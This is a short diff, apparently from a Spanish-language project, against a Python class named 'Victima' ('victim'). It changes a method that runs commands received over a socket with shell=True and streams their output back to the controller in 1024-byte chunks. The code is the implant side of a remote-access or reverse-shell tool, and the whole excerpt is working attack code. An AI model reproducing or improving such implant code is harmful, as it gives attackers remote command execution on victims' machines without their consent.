@@ -83,14 +83,14 @@ class Victima(object):
 	def enviar_comandos(self,datos):
 		comando = subprocess.Popen ((datos).strip(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, stdin = subprocess.PIPE, universal_newlines=True)
 
-		salida = [x for x in comando.stdout.readlines()]
-		self.enviar(str(len(salida)))
-		time.sleep(0.001)
+		contenido = comando.stdout.read(1024)
 
-		for _ in salida:
-			#print(_)
-			self.enviar(_)
-			time.sleep(0.001)
+		while (contenido):
+			self.client.sendall(bytes(contenido,'utf-8'))
+			contenido = comando.stdout.read(1024)
+
+		time.sleep(0.01)
+		self.client.sendall(b'ok')
 
 		return
 
